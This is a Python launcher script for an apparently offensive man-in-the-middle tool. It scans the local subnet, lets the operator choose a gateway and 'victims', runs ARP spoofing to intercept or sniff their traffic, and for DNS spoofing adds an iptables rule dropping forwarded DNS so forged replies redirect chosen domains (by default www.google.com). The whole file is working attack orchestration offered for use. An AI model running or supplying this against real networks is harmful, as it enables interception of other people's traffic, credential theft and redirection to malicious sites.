from network_utils import scan_network, get_attacker_ip, get_attacker_mac
from attacks.arp_spoof import start_arp_spoofing
from attacks.dns_spoof import start_dns_spoofer
from scapy.arch import get_if_list
import threading
import signal
import sys
import os

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


def print_banner():
    clear_screen()
    print("=" * 50)
    print("         MITM Attack Launcher (ARP / DNS)        ")
    print("=" * 50)

def print_menu():
    print("1. Start ARP spoofing only")
    print("2. Start ARP + DNS spoofing")
    print("0. Exit\n")

def choose_from_list(prompt, items):
    print("\n" + prompt)
    for i, item in enumerate(items):
        print("  {}. {}".format(i, item))
    while True:
        try:
            idx = int(input("Enter your choice: "))
            if 0 <= idx < len(items):
                return items[idx]
        except ValueError:
            pass
        print("Invalid input. Please try again.")

def choose_interface():
    interfaces = get_if_list()
    return choose_from_list("Available Network Interfaces:", interfaces)

def choose_gateway(hosts):
    print("\nSelect the gateway (router) device:")
    for i, (ip, mac) in enumerate(hosts):
        print("  {}. {} ({})".format(i, ip, mac))
    while True:
        try:
            idx = int(input("Gateway index: "))
            if 0 <= idx < len(hosts):
                return hosts[idx]
        except ValueError:
            pass
        print("Invalid input. Try again.")

def choose_victims(hosts, gateway):
    print("\nDetected devices (excluding gateway):")
    indexed = [(i, ip, mac) for i, (ip, mac) in enumerate(hosts) if (ip, mac) != gateway]
    for idx, ip, mac in indexed:
        print("  {}. {} ({})".format(idx, ip, mac))

    print("\nSelect victim indexes (comma-separated) or 'a' for all:")
    while True:
        choice = input("Your choice: ").strip()
        if choice.lower() == 'a':
            return [(ip, mac) for _, ip, mac in indexed]
        try:
            indexes = [int(i.strip()) for i in choice.split(",")]
            return [(indexed[i][1], indexed[i][2]) for i in indexes if 0 <= i < len(indexed)]
        except Exception:
            print("Invalid input. Please try again.")

def choose_arp_settings(enables_dns):
    anonymous = False
    if not enables_dns:
        print("\n[*] Choose ARP spoofing type:")
        print("  1. Normal ARP spoofing (MITM, modify packets)")
        print("  2. Anonymous ARP spoofing (SMITM, only sniff traffic)")

        while True:
            mode_input = input("Your choice [1-2]: ").strip()
            if mode_input == "1":
                anonymous = False
                break
            elif mode_input == "2":
                anonymous = True
                break
            else:
                print("Invalid input. Please choose 1 or 2.")

    print("\n[*] Choose ARP spoofing frequency:")
    print("  1. Fast (1 second)")
    print("  2. Normal (2 seconds)")
    print("  3. Slow (10 seconds)")
    print("  4. Custom")

    while True:
        freq_input = input("Your choice [1-4]: ").strip()
        if freq_input == "1":
            return anonymous, 1
        elif freq_input == "2":
            return anonymous, 2
        elif freq_input == "3":
            return anonymous, 10
        elif freq_input == "4":
            try:
                custom = int(input("Enter custom interval in seconds (>0): ").strip())
                if custom >= 1:
                    return anonymous, custom
                else:
                    print("Enter a value > 0.")
            except ValueError:
                print("Invalid input. Enter a number.")
        else:
            print("Choose 1, 2, 3, or 4.")

def launch_attack(enable_dns):
    iface = choose_interface()
    attacker_ip = get_attacker_ip(iface)
    attacker_mac = get_attacker_mac(iface)
    subnet = ".".join(attacker_ip.split(".")[:-1]) + ".0/24"

    print("\n[*] Scanning network on {}...".format(subnet))
    hosts = scan_network(subnet, iface=iface)
    if len(hosts) < 2:
        print("[-] Not enough devices found to perform attack.")
        sys.exit(1)

    gateway_ip, gateway_mac = choose_gateway(hosts)
    victims = choose_victims(hosts, (gateway_ip, gateway_mac))

    if not victims:
        print("[-] No victims selected.")
        sys.exit(1)

    anonymous, interval = choose_arp_settings(enable_dns)

    domain_ip_map = {}
    if enable_dns:
        print("\nEnter the domains you want to spoof and their fake IPs.")
        print("Leave empty and press Enter directly to use default: www.google.com -> 192.168.56.102")
        added = False
        while True:
            domain = input("Domain to spoof (or press Enter to finish): ").strip().lower()
            if not domain:
                break
            ip = input("Fake IP to redirect '{}': ".format(domain)).strip()
            if ip:
                domain_ip_map[domain] = ip
                added = True

        if not added:
            domain_ip_map = {"www.google.com": "192.168.56.102"}



    stop_event = threading.Event()
    print("\n[*] Launching ARP spoofing on {} target(s)...".format(len(victims)))

    arp_thread = threading.Thread(
        target=start_arp_spoofing,
        args=(victims, gateway_ip, gateway_mac, attacker_mac, iface, stop_event, interval, anonymous),
        daemon=True
    )
    arp_thread.start()

    try:
        if enable_dns:
            print("[*] Starting DNS spoofing...")
            os.system("iptables -I FORWARD -p udp --dport 53 -j DROP")
            start_dns_spoofer(domain_ip_map, iface)

        else:
            print("[*] ARP spoofing running. Press Ctrl+C to stop...")
            while True:
                signal.pause()
    except KeyboardInterrupt:
        print("\n[!] Interrupted. Cleaning up...")
    finally:
        print("[*] Restoring network state...")
        stop_event.set()
        arp_thread.join()
        if enable_dns:
            os.system("iptables -D FORWARD -p udp --dport 53 -j DROP")
        print("[+] Done.")

def main():
    print_banner()
    while True:
        print_menu()
        try:
            choice = input("Select option [0-2]: ").strip()
        except KeyboardInterrupt:
            choice = "0"

        if choice == "1":
            launch_attack(enable_dns=False)
        elif choice == "2":
            launch_attack(enable_dns=True)
        elif choice == "0":
            print("Exiting.")
            sys.exit(0)
        else:
            print("Invalid input. Try again.")

if __name__ == "__main__":
    main()
